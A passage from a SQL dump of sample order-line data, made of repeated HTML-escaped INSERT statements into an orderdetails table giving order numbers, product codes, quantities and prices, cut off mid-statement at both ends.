(\u0026#39;10225\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;100.19\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;116.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;71.61\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;162.57\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;69.96\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;119.06\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;135.41\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;34.74\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;51.43\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;130.60\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;77.61\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;108.26\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;129.45\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;125.40\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;122.91\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;65.41\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;47.79\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10226\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;95.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;85.27\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;50.14\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;136.00\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;59.93\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;118.23\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;146.81\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;99.21\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;87.43\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;70.56\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;27.22\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;39.42\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;84.51\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;102.17\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;78.76\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;34.88\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;214.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;100.34\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;101.31\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;57.46\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;100.53\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;84.73\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;138.88\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;110.70\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;95.99\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;104.32\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;53.48\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;157.49\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;119.87\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;43.77\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;115.01\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;34.65\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;78.97\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;49.78\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;52.36\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;91.04\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;128.42\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;153.91\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;142.18\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;47.40\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;99.36\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;59.03\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;100.70\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;57.41\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10231\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;193.25\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10231\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;147.07\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;133.86\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;97.81\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;78.12\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;113.06\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;84.88\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;86.15\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;81.43\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;48.59\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10233\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;70.81\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10233\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;66.00\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10233\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;67.94\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;118.32\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;146.65\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;84.30\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;85.75\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;67.14\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;65.09\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;78.83\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;83.28\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;45.69\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;81.95\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;89.72\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;55.27\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;63.03\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;90.90\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;66.73\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;37.09\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;88.60\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;92.74\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;116.28\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;73.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;70.33\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10236\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;105.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10236\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;52.70\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10236\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;65.51\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;91.87\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;158.80\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;129.53\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;49.74\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;109.32\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;62.33\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;35.00\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;94.91\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;78.92\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;161.49\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;104.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;73.42\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;68.35\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;144.05\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;120.53\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;53.88\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;67.91\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10239\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;100.19\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10239\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;70.07\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10239\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;135.47\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10239\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;32.47\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10239\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;133.41\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10240\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;125.97\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10240\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;136.56\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10240\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;134.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;119.46\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;153.00\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;55.70\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;126.72\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;77.31\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;62.72\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;72.02\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;47.29\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;89.05\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;117.44\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;69.34\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;107.08\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10242\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;36.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10243\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;111.87\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10243\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;30.87\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;99.66\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;48.52\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;141.75\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_2949\u0026#39;, 